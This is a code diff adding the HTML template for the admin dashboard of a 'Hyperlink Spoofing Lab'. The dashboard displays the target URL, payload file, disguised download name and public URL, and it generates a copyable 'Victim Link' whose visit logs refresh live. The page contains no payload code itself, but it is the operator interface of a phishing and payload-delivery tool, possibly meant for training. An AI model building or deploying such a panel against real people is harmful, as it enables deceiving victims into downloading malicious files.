@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Hyperlink Spoofing Lab</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+            min-height: 100vh;
+        }
+        .header {
+            background: #1a1a1a;
+            padding: 20px;
+            border-bottom: 1px solid #333;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .card h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        .config-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        .config-item {
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .config-label {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 5px;
+        }
+        .config-value {
+            font-size: 14px;
+            color: #fff;
+            word-break: break-all;
+        }
+        .logs-container {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #111;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        .log-entry {
+            color: #0f0;
+            border-bottom: 1px solid #222;
+            padding: 5px 0;
+        }
+        .log-time {
+            color: #888;
+        }
+        .log-type {
+            color: #ff0;
+        }
+        .link-box {
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        .link-url {
+            font-size: 14px;
+            color: #0ff;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #cc0000;
+        }
+        .status {
+            display: inline-block;
+            padding: 4px 8px;
+            background: #0f0;
+            color: #000;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Hyperlink Spoofing Lab — Admin Dashboard</h1>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h2>Configuration</h2>
+            <div class="config-grid">
+                <div class="config-item">
+                    <div class="config-label">Target URL</div>
+                    <div class="config-value">{{ config.target_url }}</div>
+                </div>
+                <div class="config-item">
+                    <div class="config-label">Payload File</div>
+                    <div class="config-value">{{ config.payload_file }}</div>
+                </div>
+                <div class="config-item">
+                    <div class="config-label">Download Name</div>
+                    <div class="config-value">{{ config.download_name }}</div>
+                </div>
+                <div class="config-item">
+                    <div class="config-label">Public URL</div>
+                    <div class="config-value">{{ config.public_url }}</div>
+                </div>
+                <div class="config-item">
+                    <div class="config-label">Local IP</div>
+                    <div class="config-value">{{ config.local_ip }}</div>
+                </div>
+                <div class="config-item">
+                    <div class="config-label">Port</div>
+                    <div class="config-value">{{ config.port }}</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Victim Link</h2>
+            <div class="link-box">
+                <div class="link-url" id="victimLink">{{ config.public_url }}/v?id=3IIAes4Pr9w</div>
+            </div>
+            <button class="btn" onclick="copyLink()">Copy Link</button>
+            <button class="btn" onclick="refreshLogs()">Refresh Logs</button>
+            <span class="status">SERVER RUNNING</span>
+        </div>
+
+        <div class="card">
+            <h2>Access Logs</h2>
+            <div class="logs-container" id="logsContainer">
+                {% for log in logs %}
+                <div class="log-entry">{{ log }}</div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function copyLink() {
+            var linkText = document.getElementById('victimLink').innerText;
+            navigator.clipboard.writeText(linkText).then(function() {
+                alert('Link copied to clipboard!');
+            });
+        }
+        
+        function refreshLogs() {
+            fetch('/api/logs')
+                .then(response => response.json())
+                .then(data => {
+                    var container = document.getElementById('logsContainer');
+                    container.innerHTML = '';
+                    data.logs.forEach(log => {
+                        var div = document.createElement('div');
+                        div.className = 'log-entry';
+                        div.textContent = log;
+                        container.appendChild(div);
+                    });
+                });
+        }
+        
+        // Auto-refresh logs every 5 seconds
+        setInterval(refreshLogs, 5000);
+    </script>
+</body>
+</html>
